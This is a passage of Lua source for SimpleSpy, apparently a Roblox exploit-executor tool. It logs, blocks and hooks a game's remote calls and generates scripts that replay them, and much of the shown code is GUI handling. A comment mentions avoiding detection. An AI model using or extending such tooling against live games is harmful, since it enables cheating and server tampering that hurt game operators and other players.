--- Whether or not the code box is maximized (defaults to false)
local maximized = false
--- The event logs to be read from
local logs = {}
--- The event currently selected.Log (defaults to nil)
local selected = nil
--- The blacklist (can be a string name or the Remote Instance)
local blacklist = {}
--- The block list (can be a string name or the Remote Instance)
local blocklist = {""RequestRejoinGame""}
--- Whether or not to add getNil function
local getNil = false
--- Array of remotes (and original functions) connected to
local connectedRemotes = {}
--- True = hookfunction, false = namecall
local toggle = false
local gm
local original
--- used to prevent recursives
local prevTables = {}
--- holds logs (for deletion)
local remoteLogs = {}
--- used for hookfunction
local remoteEvent = Instance.new(""RemoteEvent"")
--- used for hookfunction
local remoteFunction = Instance.new(""RemoteFunction"")
local originalEvent = remoteEvent.FireServer
local originalFunction = remoteFunction.InvokeServer
--- the maximum amount of remotes allowed in logs
_G.SIMPLESPYCONFIG_MaxRemotes = 500
--- how many spaces to indent
local indent = 4
--- used for task scheduler
local scheduled = {}
--- RBXScriptConnect of the task scheduler
local schedulerconnect
local SimpleSpy = {}
local topstr = """"
local bottomstr = """"
local remotesFadeIn
local rightFadeIn
local codebox
local p
local getnilrequired = false

-- autoblock variables
local autoblock = false
local history = {}
local excluding = {}

-- function info variables
local funcEnabled = true

-- remote hooking/connecting api variables
local remoteSignals = {}
local remoteHooks = {}

-- original mouse icon
local oldIcon

-- if mouse inside gui
local mouseInGui = false

-- handy array of RBXScriptConnections to disconnect on shutdown
local connections = {}

-- whether or not SimpleSpy uses 'getcallingscript()' to get the script (default is false because detection)
local useGetCallingScript = false

--- used to enable/disable SimpleSpy's keyToString for remotes
local keyToString = false

-- determines whether return values are recorded
local recordReturnValues = false

-- functions

--- Converts arguments to a string and generates code that calls the specified method with them, recommended to be used in conjunction with ValueToString (method must be a string, e.g. `game:GetService(""ReplicatedStorage"").Remote.remote:FireServer`)
--- @param method string
--- @param args any[]
--- @return string
function SimpleSpy:ArgsToString(method, args)
	assert(typeof(method) == ""string"", ""string expected, got "" .. typeof(method))
	assert(typeof(args) == ""table"", ""table expected, got "" .. typeof(args))
	return v2v({ args = args }) .. ""\n\n"" .. method .. ""(unpack(args))""
end

--- Converts a value to variables with the specified index as the variable name (if nil/invalid then the name will be assigned automatically)
--- @param t any[]
--- @return string
function SimpleSpy:TableToVars(t)
	assert(typeof(t) == ""table"", ""table expected, got "" .. typeof(t))
	return v2v(t)
end

--- Converts a value to a variable with the specified `variablename` (if nil/invalid then the name will be assigned automatically)
--- @param value any
--- @return string
function SimpleSpy:ValueToVar(value, variablename)
	assert(variablename == nil or typeof(variablename) == ""string"", ""string expected, got "" .. typeof(variablename))
	if not variablename then
		variablename = 1
	end
	return v2v({ [variablename] = value })
end

--- Converts any value to a string, cannot preserve function contents
--- @param value any
--- @return string
function SimpleSpy:ValueToString(value)
	return v2s(value)
end

--- Generates the simplespy function info
--- @param func function
--- @return string
function SimpleSpy:GetFunctionInfo(func)
	assert(typeof(func) == ""function"", ""Instance expected, got "" .. typeof(func))
	warn(""Function info currently unavailable due to crashing in Synapse X"")
	return v2v({ functionInfo = {
		info = debug.getinfo(func),
		constants = debug.getconstants(func),
	} })
end

--- Gets the ScriptSignal for a specified remote being fired
--- @param remote Instance
function SimpleSpy:GetRemoteFiredSignal(remote)
	assert(typeof(remote) == ""Instance"", ""Instance expected, got "" .. typeof(remote))
	if not remoteSignals[remote] then
		remoteSignals[remote] = newSignal()
	end
	return remoteSignals[remote]
end

--- Allows for direct hooking of remotes **THIS CAN BE VERY DANGEROUS**
--- @param remote Instance
--- @param f function
function SimpleSpy:HookRemote(remote, f)
	assert(typeof(remote) == ""Instance"", ""Instance expected, got "" .. typeof(remote))
	assert(typeof(f) == ""function"", ""function expected, got "" .. typeof(f))
	remoteHooks[remote] = f
end

--- Blocks the specified remote instance/string
--- @param remote any
function SimpleSpy:BlockRemote(remote)
	assert(
		typeof(remote) == ""Instance"" or typeof(remote) == ""string"",
		""Instance | string expected, got "" .. typeof(remote)
	)
	blocklist[remote] = true
end

--- Excludes the specified remote from logs (instance/string)
--- @param remote any
function SimpleSpy:ExcludeRemote(remote)
	assert(
		typeof(remote) == ""Instance"" or typeof(remote) == ""string"",
		""Instance | string expected, got "" .. typeof(remote)
	)
	blacklist[remote] = true
end

--- Creates a new ScriptSignal that can be connected to and fired
--- @return table
function newSignal()
	local connected = {}
	return {
		Connect = function(self, f)
			assert(connected, ""Signal is closed"")
			connected[tostring(f)] = f
			return {
				Connected = true,
				Disconnect = function(self)
					if not connected then
						warn(""Signal is already closed"")
					end
					self.Connected = false
					connected[tostring(f)] = nil
				end,
			}
		end,
		Wait = function(self)
			local thread = coroutine.running()
			local connection
			connection = self:Connect(function()
				connection:Disconnect()
				if coroutine.status(thread) == ""suspended"" then
					coroutine.resume(thread)
				end
			end)
			coroutine.yield()
		end,
		Fire = function(self, ...)
			for _, f in pairs(connected) do
				coroutine.wrap(f)(...)
			end
		end,
	}
end

--- Prevents remote spam from causing lag (clears logs after `_G.SIMPLESPYCONFIG_MaxRemotes` or 500 remotes)
function clean()
	local max = _G.SIMPLESPYCONFIG_MaxRemotes
	if not typeof(max) == ""number"" and math.floor(max) ~= max then
		max = 500
	end
	if #remoteLogs > max then
		for i = 100, #remoteLogs do
			local v = remoteLogs[i]
			if typeof(v[1]) == ""RBXScriptConnection"" then
				v[1]:Disconnect()
			end
			if typeof(v[2]) == ""Instance"" then
				v[2]:Destroy()
			end
		end
		local newLogs = {}
		for i = 1, 100 do
			table.insert(newLogs, remoteLogs[i])
		end
		remoteLogs = newLogs
	end
end

--- Scales the ToolTip to fit containing text
function scaleToolTip()
	local size = TextService:GetTextSize(
		TextLabel.Text,
		TextLabel.TextSize,
		TextLabel.Font,
		Vector2.new(196, math.huge)
	)
	TextLabel.Size = UDim2.new(0, size.X, 0, size.Y)
	ToolTip.Size = UDim2.new(0, size.X + 4, 0, size.Y + 4)
end

--- Executed when the toggle button (the SimpleSpy logo) is hovered over
function onToggleButtonHover()
	if not toggle then
		TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(252, 51, 51) }):Play()
	else
		TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(68, 206, 91) }):Play()
	end
end

--- Executed when the toggle button is unhovered over
function onToggleButtonUnhover()
	TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(255, 255, 255) }):Play()
end

--- Executed when the X button is hovered over
function onXButtonHover()
	TweenService:Create(CloseButton, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(255, 60, 60) }):Play()
end

--- Executed when the X button is unhovered over
function onXButtonUnhover()
	TweenService:Create(CloseButton, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(37, 36, 38) }):Play()
end

--- Toggles the remote spy method (when button clicked)
function onToggleButtonClick()
	if toggle then
		TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(252, 51, 51) }):Play()
	else
		TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(68, 206, 91) }):Play()
	end
	toggleSpyMethod()
end

--- Reconnects bringBackOnResize if the current viewport changes and also connects it initially
function connectResize()
	local lastCam = workspace.CurrentCamera:GetPropertyChangedSignal(""ViewportSize""):Connect(bringBackOnResize)
	workspace:GetPropertyChangedSignal(""CurrentCamera""):Connect(function()
		lastCam:Disconnect()
		if workspace.CurrentCamera then
			lastCam = workspace.CurrentCamera:GetPropertyChangedSignal(""ViewportSize""):Connect(bringBackOnResize)
		end
	end)
end

--- Brings gui back if it gets lost offscreen (connected to the camera viewport changing)
function bringBackOnResize()
	validateSize()
	if sideClosed then
		minimizeSize()
	else
		maximizeSize()
	end
	local currentX = Background.AbsolutePosition.X
	local currentY = Background.AbsolutePosition.Y
	local viewportSize = workspace.CurrentCamera.ViewportSize
	if (currentX < 0) or (currentX > (viewportSize.X - (sideClosed and 131 or Background.AbsoluteSize.X))) then
		if currentX < 0 then
			currentX = 0
		else
			currentX = viewportSize.X - (sideClosed and 131 or Background.AbsoluteSize.X)
		end
	end
	if (currentY < 0) or (currentY > (viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36)) then
		if currentY < 0 then
			currentY = 0
		else
			currentY = viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36
		end
	end
	TweenService.Create(
		TweenService,
		Background,
		TweenInfo.new(0.1),
		{ Position = UDim2.new(0, currentX, 0, currentY) }
	):Play()
end

--- Drags gui (so long as mouse is held down)
--- @param input InputObject
function onBarInput(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		local lastPos = UserInputService.GetMouseLocation(UserInputService)
		local mainPos = Background.AbsolutePosition
		local offset = mainPos - lastPos
		local currentPos = offset + lastPos
		RunService.BindToRenderStep(RunService, ""drag"", 1, function()
			local newPos = UserInputService.GetMouseLocation(UserInputService)
			if newPos ~= lastPos then
				local currentX = (offset + newPos).X
				local currentY = (offset + newPos).Y
				local viewportSize = workspace.CurrentCamera.ViewportSize
				if
					(currentX < 0 and currentX < currentPos.X)
					or (
						currentX > (viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X))
						and currentX > currentPos.X
					)
				then
					if currentX < 0 then
						currentX = 0
					else
						currentX = viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X)
					end
				end
				if
					(currentY < 0 and currentY < currentPos.Y)
					or (
						currentY > (viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36)
						and currentY > currentPos.Y
					)
				then
					if currentY < 0 then
						currentY = 0
					else
						currentY = viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36
					end
				end
				currentPos = Vector2.new(currentX, currentY)
				lastPos = newPos
				TweenService.Create(
					TweenService,
					Background,
					TweenInfo.new(0.1),
					{ Position = UDim2.new(0, currentPos.X, 0, currentPos.Y) }
				):Play()
			end
			-- if input.UserInputState ~= Enum.UserInputState.Begin then
			--     RunService.UnbindFromRenderStep(RunService, ""drag"")
			-- end
		end)
		table.insert(
			connections,
			UserInputService.InputEnded:Connect(function(inputE)
				if input == inputE then
					RunService:UnbindFromRenderStep(""drag"")
				end
			end)
		)
	end
end

--- Fades out the table of elements (and makes them invisible), returns a function to make them visible again
function fadeOut(elements)
	local data = {}
	for _, v in pairs(elements) do
		if typeof(v) == ""Instance"" and v:IsA(""GuiObject"") and v.Visible then
			coroutine.wrap(function()
				data[v] = {
					BackgroundTransparency = v.BackgroundTransparency,
				}
				TweenService:Create(v, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
				if v:IsA(""TextBox"") or v:IsA(""TextButton"") or v:IsA(""TextLabel"") then
					data[v].TextTransparency = v.TextTransparency
					TweenService:Create(v, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
				elseif v:IsA(""ImageButton"") or v:IsA(""ImageLabel"") then
					data[v].ImageTransparency = v.ImageTransparency
					TweenService:Create(v, TweenInfo.new(0.5), { ImageTransparency = 1 }):Play()
				end
				wait(0.5)
				v.Visible = false
				for i, x in pairs(data[v]) do
					v[i] = x
				end
				data[v] = true
			end)()
		end
	end
	return function()
		for i, _ in pairs(data) do
			coroutine.wrap(function()
				local properties = {
					BackgroundTransparency = i.BackgroundTransparency,
				}
				i.BackgroundTransparency = 1
				TweenService
					:Create(i, TweenInfo.new(0.5), { BackgroundTransparency = properties.BackgroundTransparency })
					:Play()
				if i:IsA(""TextBox"") or i:IsA(""TextButton"") or i:IsA(""TextLabel"") then
					properties.TextTransparency = i.TextTransparency
					i.TextTransparency = 1
					TweenService
						:Create(i, TweenInfo.new(0.5), { TextTransparency = properties.TextTransparency })
						:Play()
				elseif i:IsA(""ImageButton"") or i:IsA(""ImageLabel"") then
					properties.ImageTransparency = i.ImageTransparency
					i.ImageTransparency = 1
					TweenService
						:Create(i, TweenInfo.new(0.5), { ImageTransparency = properties.ImageTransparency })
						:Play()
				end
				i.Visible = true
			end)()
		end
	end
end

--- Expands and minimizes the gui (closed is the toggle boolean)
function toggleMinimize(override)
	if mainClosing and not override or maximized then
		return
	end
	mainClosing = true
	closed = not closed
	if closed then
		if not sideClosed then
			toggleSideTray(true)
		end
		LeftPanel.Visible = true
		TweenService:Create(LeftPanel, TweenInfo.new(0.5), { Size = UDim2.new(0, 131, 0, 0) }):Play()
		wait(0.5)
		remotesFadeIn = fadeOut(LeftPanel:GetDescendants())
		wait(0.5)
	else
		TweenService:Create(LeftPanel, TweenInfo.new(0.5), { Size = UDim2.new(0, 131, 0, 249) }):Play()
		wait(0.5)
		if remotesFadeIn then
			remotesFadeIn()
			remotesFadeIn = nil
		end
		bringBackOnResize()
	end
	mainClosing = false
end

--- Expands and minimizes the sidebar (sideClosed is the toggle boolean)
function toggleSideTray(override)
	if sideClosing and not override or maximized then
		return
	end
	sideClosing = true
	sideClosed = not sideClosed
	if sideClosed then
		rightFadeIn = fadeOut(RightPanel:GetDescendants())
		wait(0.5)
		minimizeSize(0.5)
		wait(0.5)
		RightPanel.Visible = false
	else
		if closed then
			toggleMinimize(true)
		end
		RightPanel.Visible = true
		maximizeSize(0.5)
		wait(0.5)
		if rightFadeIn then
			rightFadeIn()
		end
		bringBackOnResize()
	end
	sideClosing = false
end

--- Expands code box to fit screen for more convenient viewing
function toggleMaximize()
	if not sideClosed and not maximized then
		maximized = true
		local disable = Instance.new(""TextButton"")
		local prevSize = UDim2.new(0, CodeBox.AbsoluteSize.X, 0, CodeBox.AbsoluteSize.Y)
		local prevPos = UDim2.new(0, CodeBox.AbsolutePosition.X, 0, CodeBox.AbsolutePosition.Y)
		disable.Size = UDim2.new(1, 0, 1, 0)
		disable.BackgroundColor3 = Color3.new()
		disable.BorderSizePixel = 0
		disable.Text = 0
		disable.ZIndex = 3
		disable.BackgroundTransparency = 1
		disable.AutoButtonColor = false
		CodeBox.ZIndex = 4
		CodeBox.Position = prevPos
		CodeBox.Size = prevSize
		TweenService
			:Create(
				CodeBox,
				TweenInfo.new(0.5),
				{ Size = UDim2.new(0.5, 0, 0.5, 0), Position = UDim2.new(0.25, 0, 0.25, 0) }
			)
			:Play()
		TweenService:Create(disable, TweenInfo.new(0.5), { BackgroundTransparency = 0.5 }):Play()
		disable.MouseButton1Click:Connect(function()
			if
				UserInputService:GetMouseLocation().Y + 36 >= CodeBox.AbsolutePosition.Y
				and UserInputService:GetMouseLocation().Y + 36 <= CodeBox.AbsolutePosition.Y + CodeBox.AbsoluteSize.Y
				and UserInputService:GetMouseLocation().X >= CodeBox.AbsolutePosition.X
				and UserInputService:GetMouseLocation().X <= CodeBox.AbsolutePosition.X + CodeBox.AbsoluteSize.X
			then
				return
			end
			TweenService:Create(CodeBox, TweenInfo.new(0.5), { Size = prevSize, Position = prevPos }):Play()
			TweenService:Create(disable, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
			maximized = false
			wait(0.5)
			disable:Destroy()
			CodeBox.Size = UDim2.new(1, 0, 0.5, 0)
			CodeBox.Position = UDim2.new(0, 0, 0, 0)
			CodeBox.ZIndex = 0
		end)
	end
end

--- Checks if cursor is within resize range
--- @param p Vector2
function isInResizeRange(p)
	local relativeP = p - Background.AbsolutePosition
	local range = 5
	if
		relativeP.X >= TopBar.AbsoluteSize.X - range
		and relativeP.Y >= Background.AbsoluteSize.Y - range
		and relativeP.X <= TopBar.AbsoluteSize.X
		and relativeP.Y <= Background.AbsoluteSize.Y
	then
		return true, ""B""
	elseif relativeP.X >= TopBar.AbsoluteSize.X - range and relativeP.X <= Background.AbsoluteSize.X then
		return true, ""X""
	elseif relativeP.Y >= Background.AbsoluteSize.Y - range and relativeP.Y <= Background.AbsoluteSize.Y then
		return true, ""Y""
	end
	return false
end

--- Checks if cursor is within dragging range
--- @param p Vector2
function isInDragRange(p)
	local relativeP = p - Background.AbsolutePosition
	if
		relativeP.X <= TopBar.AbsoluteSize.X - CloseButton.AbsoluteSize.X * 3
		and relativeP.X >= 0
		and relativeP.Y <= TopBar.AbsoluteSize.Y
		and relativeP.Y >= 0
	then
		return true
	end
	return false
end

--- Called when mouse enters SimpleSpy
function mouseEntered()
	local existingCursor = SimpleSpy2:FindFirstChild(""Cursor"")
	while existingCursor do
		existingCursor:Destroy()
		existingCursor = SimpleSpy2:FindFirstChild(""Cursor"")
	end
	local customCursor = Instance.new(""ImageLabel"")
	customCursor.Name = ""Cursor""
	customCursor.Size = UDim2.fromOffset(200, 200)
	customCursor.ZIndex = 1e5
	customCursor.BackgroundTransparency = 1
	customCursor.Image = """"
	customCursor.Parent = SimpleSpy2
	UserInputService.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.ForceHide
	RunService:BindToRenderStep(""SIMPLESPY_CURSOR"", 1, function()
		if mouseInGui and _G.SimpleSpyExecuted then
			local mouseLocation = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
			customCursor.Position = UDim2.fromOffset(
				mouseLocation.X - customCursor.AbsoluteSize.X / 2,
				mouseLocation.Y - customCursor.AbsoluteSize.Y / 2
			)
			local inRange, type = isInResizeRange(mouseLocation)
			if inRange and not sideClosed and not closed then
				customCursor.Image = type == ""B"" and ""rbxassetid://6065821980""
					or type == ""X"" and ""rbxassetid://6065821086""
					or type == ""Y"" and ""rbxassetid://6065821596""
			elseif inRange and not closed and type == ""Y"" or type == ""B"" then
				customCursor.Image = ""rbxassetid://6065821596""
			elseif customCursor.Image ~= ""rbxassetid://6065775281"" then
				customCursor.Image = ""rbxassetid://6065775281""
			end
		else
			UserInputService.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
			customCursor:Destroy()
			RunService:UnbindFromRenderStep(""SIMPLESPY_CURSOR"")
		end
	end)
end

--- Called when mouse moves
function mouseMoved()
	local mousePos = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
	if
		not closed
		and mousePos.X >= TopBar.AbsolutePosition.X
		and mousePos.X <= TopBar.AbsolutePosition.X + TopBar.AbsoluteSize.X
		and mousePos.Y >= Background.AbsolutePosition.Y
		and mousePos.Y <= Background.AbsolutePosition.Y + Background.AbsoluteSize.Y
	then
		if not mouseInGui then
			mouseInGui = true
			mouseEntered()
		end
	else
		mouseInGui = false
	end
end

--- Adjusts the ui elements to the 'Maximized' size
function maximizeSize(speed)
	if not speed then
		speed = 0.05
	end
	TweenService
		:Create(
			LeftPanel,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }
		)
		:Play()
	TweenService
		:Create(RightPanel, TweenInfo.new(speed), {
			Size = UDim2.fromOffset(
				Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X,
				Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y
			),
		})
		:Play()
	TweenService
		:Create(
			TopBar,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(Background.AbsoluteSize.X, TopBar.AbsoluteSize.Y) }
		)
		:Play()
	TweenService
		:Create(ScrollingFrame, TweenInfo.new(speed), {
			Size = UDim2.fromOffset(Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X, 110),
			Position = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y),
		})
		:Play()
	TweenService
		:Create(CodeBox, TweenInfo.new(speed), {
			Size = UDim2.fromOffset(
				Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X,
				Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y
			),
		})
		:Play()
	TweenService
		:Create(
			LogList,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(LogList.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y - 18) }
		)
		:Play()
end

--- Adjusts the ui elements to close the side
function minimizeSize(speed)
	if not speed then
		speed = 0.05
	end
	TweenService
		:Create(
			LeftPanel,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }
		)
		:Play()
	TweenService
		:Create(
			RightPanel,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(0, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }
		)
		:Play()
	TweenService
		:Create(
			TopBar,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, TopBar.AbsoluteSize.Y) }
		)
		:Play()
	TweenService
		:Create(ScrollingFrame, TweenInfo.new(speed), {
			Size = UDim2.fromOffset(0, 119),
			Position = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y),
		})
		:Play()
	TweenService
		:Create(
			CodeBox,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y) }
		)
		:Play()
	TweenService
		:Create(
			LogList,
			TweenInfo.new(speed),
			{ Size = UDim2.fromOffset(LogList.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y - 18) }
		)
		:Play()
end

--- Ensures size is within screensize limitations
function validateSize()
	local x, y = Background.AbsoluteSize.X, Background.AbsoluteSize.Y
	local screenSize = workspace.CurrentCamera.ViewportSize
	if x + Background.AbsolutePosition.X > screenSize.X then
		if screenSize.X - Background.AbsolutePosition.X >= 450 then
			x = screenSize.X - Background.AbsolutePosition.X
		else
			x = 450
		end
	elseif y + Background.AbsolutePosition.Y > screenSize.Y then
		if screenSize.X - Background.AbsolutePosition.Y >= 268 then
			y = screenSize.Y - Background.AbsolutePosition.Y
		else
			y = 268
		end
	end
	Background.Size = UDim2.fromOffset(x, y)
end

--- Called on user input while mouse in 'Background' frame
--- @param input InputObject
function backgroundUserInput(input)
	local mousePos = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
	local inResizeRange, type = isInResizeRange(mousePos)
	if input.UserInputType == Enum.UserInputType.MouseButton1 and inResizeRange then
		local lastPos = UserInputService:GetMouseLocation()
		local offset = Background.AbsoluteSize - lastPos
		local currentPos = lastPos + offset
		RunService:BindToRenderStep(""SIMPLESPY_RESIZE"", 1, function()
			local newPos = UserInputService:GetMouseLocation()
			if newPos ~= lastPos then
				local currentX = (newPos + offset).X
				local currentY = (newPos + offset).Y
				if currentX < 450 then
					currentX = 450
				end
				if currentY < 268 then
					currentY = 268
				end
				currentPos = Vector2.new(currentX, currentY)
				Background.Size = UDim2.fromOffset(
					(not sideClosed and not closed and (type == ""X"" or type == ""B"")) and currentPos.X
						or Background.AbsoluteSize.X,
					(--[[(not sideClosed or currentPos.X <= LeftPanel.AbsolutePosition.X + LeftPanel.AbsoluteSize.X) and]]not closed and (type == ""Y"" or type == ""B""))
							and currentPos.Y
						or Background.AbsoluteSize.Y
				)
				validateSize()
				if sideClosed then
					minimizeSize()
				else
					maximizeSize()
				end
				lastPos = newPos
			end
		end)
		table.insert(
			connections,
			UserInputService.InputEnded:Connect(function(inputE)
				if input == inputE then
					RunService:UnbindFromRenderStep(""SIMPLESPY_RESIZE"")
				end
			end)
		)
	elseif isInDragRange(mousePos) then
		onBarInput(input)
	end
end

--- Gets the player an instance is descended from
function getPlayerFromInstance(instance)
	for _, v in pairs(Players:GetPlayers()) do
		if v.Character and (instance:IsDescendantOf(v.Character) or instance == v.Character) then
			return v
		end
	end
end

--- Runs on MouseButton1Click of an event frame
function eventSelect(frame)
	if selected and selected.Log and selected.Log.Button then
		TweenService
			:Create(selected.Log.Button, TweenInfo.new(0.5), { BackgroundColor3 = Color3.fromRGB(0, 0, 0) })
			:Play()
		selected = nil
	end
	for _, v in pairs(logs) do
		if frame == v.Log then
			selected = v
		end
	end
	if selected and selected.Log then
		TweenService
			:Create(frame.Button, TweenInfo.new(0.5), { BackgroundColor3 = Color3.fromRGB(92, 126, 229) })
			:Play()
		codebox:setRaw(selected.GenScript)
	end
	if sideClosed then
		toggleSideTray()
	end
end

--- Updates the canvas size to fit the current amount of function buttons
function updateFunctionCanvas()
	ScrollingFrame.CanvasSize = UDim2.fromOffset(UIGridLayout.AbsoluteContentSize.X, UIGridLayout.AbsoluteContentSize.Y)
end

--- Updates the canvas size to fit the amount of current remotes
function updateRemoteCanvas()
	LogList.CanvasSize = UDim2.fromOffset(UIListLayout.AbsoluteContentSize.X, UIListLayout.AbsoluteContentSize.Y)
end

--- Allows for toggling of the tooltip and easy setting of le description
--- @param enable boolean
--- @param text string
function makeToolTip(enable, text)
	if enable then
		if ToolTip.Visible then
			ToolTip.Visible = false
			RunService:UnbindFromRenderStep(""ToolTip"")
		end
		local first = true
		RunService:BindToRenderStep(""ToolTip"", 1, function()
			local topLeft = Vector2.new(Mouse.X + 20, Mouse.Y + 20)
			local bottomRight = topLeft + ToolTip.AbsoluteSize
			if topLeft.X < 0 then
				topLeft = Vector2.new(0, topLeft.Y)
			elseif bottomRight.X > workspace.CurrentCamera.ViewportSize.X then
				topLeft = Vector2.new(workspace.CurrentCamera.ViewportSize.X - ToolTip.AbsoluteSize.X, topLeft.Y)
			end
			if topLeft.Y < 0 then
				topLeft = Vector2.new(topLeft.X, 0)
			elseif bottomRight.Y > workspace.CurrentCamera.ViewportSize.Y - 35 then
				topLeft = Vector2.new(topLeft.X, workspace.CurrentCamera.ViewportSize.Y - ToolTip.AbsoluteSize.Y - 35)
			end
			if topLeft.X <= Mouse.X and topLeft.Y <= Mouse.Y then
				topLeft = Vector2.new(Mouse.X - ToolTip.AbsoluteSize.X - 2, Mouse.Y - ToolTip.AbsoluteSize.Y - 2)
			end
			if first then
				ToolTip.Position = UDim2.fromOffset(topLeft.X, topLeft.Y)
				first = false
			else
				ToolTip:TweenPosition(UDim2.fromOffset(topLeft.X, topLeft.Y), ""Out"", ""Linear"", 0.1)
			end
		end)
		TextLabel.Text = text
		ToolTip.Visible = true
	else
		if ToolTip.Visible then
			ToolTip.Visible = false
			RunService:UnbindFromRenderStep(""ToolTip"")
		end
	end
end

--- Creates new function button (below codebox)
--- @param name string
---@param description function
---@param onClick function
function newButton(name, description, onClick)
	local button = FunctionTemplate:Clone()
	button.Text.Text = name
	button.Button.MouseEnter:Connect(function()
		makeToolTip(true, description())
	end)
	button.Button.MouseLeave:Connect(function()
		makeToolTip(false)
	end)
	button.AncestryChanged:Connect(function()
		makeToolTip(false)
	end)
	button.Button.MouseButton1Click:Connect(function(...)
		onClick(button, ...)
	end)
	button.Parent = ScrollingFrame
	updateFunctionCanvas()
end

--- Adds new Remote to logs
--- @param name string The name of the remote being logged
--- @param type string The type of the remote being logged (either 'function' or 'event')
--- @param args any
--- @param remote any
--- @param function_info string
--- @param blocked any
function newRemote(type, name, args, remote, function_info, blocked, src, returnValue)
	local remoteFrame = RemoteTemplate:Clone()
	remoteFrame.Text.Text = string.sub(name, 1, 50)
	remoteFrame.ColorBar.BackgroundColor3 = type == ""event"" and Color3.new(255, 242, 0) or Color3.fromRGB(99, 86, 245)
	local id = Instance.new(""IntValue"")
	id.Name = ""ID""
	id.Value = #logs + 1
	id.Parent = remoteFrame
	local weakRemoteTable = setmetatable({ remote = remote }, { __mode = ""v"" })
	local log = {
		Name = name,
		Function = function_info,
		Remote = weakRemoteTable,
		Log = remoteFrame,
		Blocked = blocked,
		Source = src,
		GenScript = ""-- Generating, please wait... (click to reload)\n-- (If this message persists, the remote args are likely extremely long)"",
		ReturnValue = returnValue,
	}
	logs[#logs + 1] = log
	schedule(function()
		log.GenScript = genScript(remote, args)
		if blocked then
			logs[#logs].GenScript = ""-- THIS REMOTE WAS PREVENTED FROM FIRING THE SERVER BY SIMPLESPY\n\n""
				.. logs[#logs].GenScript
		end
	end)
	local connect = remoteFrame.Button.MouseButton1Click:Connect(function()
		eventSelect(remoteFrame)
	end)
	if layoutOrderNum < 1 then
		layoutOrderNum = 999999999
	end
	remoteFrame.LayoutOrder = layoutOrderNum
	layoutOrderNum = layoutOrderNum - 1
	remoteFrame.Parent = LogList
	table.insert(remoteLogs, 1, { connect, remoteFrame })
	clean()
	updateRemoteCanvas()
end

--- Generates a script from the provided arguments (first has to be remote path)
function genScript(remote, args)
	prevTables = {}
	local gen = """"
	if #args > 0 then
		if not pcall(function()
			gen = v2v({ args = args }) .. ""\n""
		end) then
			gen = gen
				.. ""-- TableToString failure! Reverting to legacy functionality (results may vary)\nlocal args = {""
			if
				not pcall(function()
					for i, v in pairs(args) do
						if type(i) ~= ""Instance"" and type(i) ~= ""userdata"" then
							gen = gen .. ""\n    [object] = ""
						elseif type(i) == ""string"" then
							gen = gen .. '\n    [""' .. i .. '""] = '
						elseif type(i) == ""userdata"" and typeof(i) ~= ""Instance"" then
							gen = gen .. ""\n    ["" .. string.format(""nil --[[%s]]"", typeof(v)) .. "")] = ""
						elseif type(i) == ""userdata"" then
							gen = gen .. ""\n    [game."" .. i:GetFullName() .. "")] = ""
						end
						if type(v) ~= ""Instance"" and type(v) ~= ""userdata"" then
							gen = gen .. ""object""
						elseif type(v) == ""string"" then
							gen = gen .. '""' .. v .. '""'
						elseif type(v) == ""userdata"" and typeof(v) ~= ""Instance"" then
							gen = gen .. string.format(""nil --[[%s]]"", typeof(v))
						elseif type(v) == ""userdata"" then
							gen = gen .. ""game."" .. v:GetFullName()
						end
					end
					gen = gen .. ""\n}\n\n""
				end)
			then
				gen = gen .. ""}\n-- Legacy tableToString failure! Unable to decompile.""
			end
		end
		if not remote:IsDescendantOf(game) and not getnilrequired then
			gen = ""function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end\n\n""
				.. gen
		end
		if remote:IsA(""RemoteEvent"") then
			gen = gen .. v2s(remote) .. "":FireServer(unpack(args))""
		elseif remote:IsA(""RemoteFunction"") then
			gen = gen .. v2s(remote) .. "":InvokeServer(unpack(args))""
		end
